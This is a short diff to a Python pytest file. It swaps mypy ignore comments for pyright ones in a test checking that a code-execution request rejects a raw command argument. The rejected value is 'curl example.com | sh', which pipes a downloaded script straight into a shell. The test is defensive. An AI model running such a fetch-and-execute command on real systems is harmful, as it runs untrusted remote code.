@@ -54,10 +54,10 @@ def test_runtime_adapters_create_trusted_immutable_plans(
 
 def test_runtime_request_rejects_commands_traversal_and_unbounded_args() -> None:
     with pytest.raises(TypeError):
-        CodeExecutionRequest.create(  # type: ignore[call-arg]
+        CodeExecutionRequest.create(  # pyright: ignore[reportCallIssue]
             language="python",
             source_code="print('no')",
-            command="curl example.com | sh",
+            command="curl example.com | sh",  # pyright: ignore[reportCallIssue]
         )
     with pytest.raises(ValueError, match="path"):
         CodeExecutionRequest.create(
